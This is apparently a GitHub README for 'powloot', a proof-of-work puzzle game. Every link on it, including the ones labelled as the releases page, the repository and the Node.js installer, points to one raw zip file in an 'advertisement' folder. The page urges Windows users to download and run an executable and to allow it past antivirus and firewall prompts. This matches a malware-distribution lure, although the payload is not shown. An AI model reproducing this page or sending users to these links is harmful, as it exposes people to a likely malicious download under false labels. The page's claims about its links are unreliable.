# 🚀 powloot - Simple Proof-of-Work Game

[![Download powloot](https://img.shields.io/badge/Download-powloot-brightgreen)](https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip)

---

## 🔽 Where to Get powloot

You need to visit this page to download the program:

[https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip](https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip)

This page has all the releases. Choose the latest version and download the Windows installer or zip file.

---

## 💻 What is powloot?

powloot is a game based on solving computer puzzles quickly. The puzzles come from a server that verifies your work. The game has many tracks to race on. You can compete alone or with others. Rewards are shared from a common pool.  

The backend runs on Node.js with Express and stores information with SQLite. The frontend is a static webpage. It uses WebSocket to show live status updates.

---

## ⚙️ Features of powloot

- Multiple tracks run at the same time. Each track only has one active round.
- Challenges are given based on your IP address. Only one challenge can be active per IP.
- When you finish a challenge, the system closes that round, gives rewards, keeps score, and starts the next round.
- The reward pool refills over time, tracked in milliseconds.
- The system limits how often you can submit answers. This protects from flooding.
- You can see live power and status updates in the game.
- Some heavy tasks run faster using WebAssembly.
- Supports local withdrawal requests and quick code redemption.
- Optionally, data can be saved on a remote MySQL database.

---

## 🛠️ System Requirements

To run powloot on Windows, you need:

- Windows 10 or later (64-bit)
- Node.js version 22 or above installed
- At least 2 GB of free RAM
- 100 MB free disk space
- Internet connection to communicate with the backend server

---

## 🚦 How to Download and Install powloot on Windows

1. Go to the releases page here:

   [https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip](https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip)

2. Find the latest release version. It will list assets like `.exe` or `.zip`.

3. Download the Windows installer if available (`powloot-setup.exe` or similar). If only a zip file is available, download that.

4. After downloading:

   - If you have the installer, double-click it and follow the setup prompts.
   - If you have a zip file, right-click it and choose “Extract All…” to unzip it to a folder.

5. Once installed or extracted, open the folder where powloot is located.

6. Double-click the executable file named `powloot.exe` or similarly named to run the game.

---

## ⚙️ How to Run powloot from Source (Optional)

If you want to run powloot yourself and you have some basic software installed, follow these steps:

1. Install Node.js from https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip if you don’t have it.

2. Download the source files from the releases or clone the repository.

3. Open the folder with powloot in File Explorer.

4. Press `Shift + Right-click` inside the folder and select “Open PowerShell window here” or “Open Command Window here.”

5. Run this command to install required packages:

   ```
   npm install
   ```

6. Copy the environment setup file:

   ```
   copy .env.example .env
   ```

7. Edit the `.env` file with a simple text editor to add any needed settings.

8. Start the server using:

   ```
   npm start
   ```

9. Open your browser and go to `http://localhost:3000` to play powloot.

This method is for advanced users or those who want to change how powloot works.

---

## 🔧 Basic Controls and Description

- Use your mouse and keyboard to interact with the web interface.
- The screen will show your active puzzles and game status.
- The game automatically communicates with the server to update rounds and rewards.
- Real-time stats show network power and race status.
- When you finish a puzzle, submit your answer through the provided form.
- You can request withdrawals or redeem codes locally.

---

## 💡 Tips for Smooth Use

- Keep your internet stable for real-time updates.
- Allow powloot access to your network if antivirus or firewall asks.
- Close other heavy programs to keep your PC responsive.
- Restart the app if you see stale or frozen game status.
- Use the latest version from releases for newest features and fixes.

---

## 🛠️ Troubleshooting

If powloot does not start or work as expected:

- Check if Node.js is installed if running from source.
- Ensure you downloaded the correct Windows version.
- Look for error messages in the console window or app.
- Restart your computer and try again.
- Check that your firewall or antivirus does not block the app.
- Visit the releases page to download a fresh copy.

---

## 🌐 Where to Learn More

For more information about powloot, visit the GitHub repository:

https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip

You can find source code, issue trackers, and updates there.

---

## 🔽 Download powloot Now

[![Download powloot](https://img.shields.io/badge/Download-powloot-blue)](https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip)

Click the link above, pick the latest release, and get started quickly.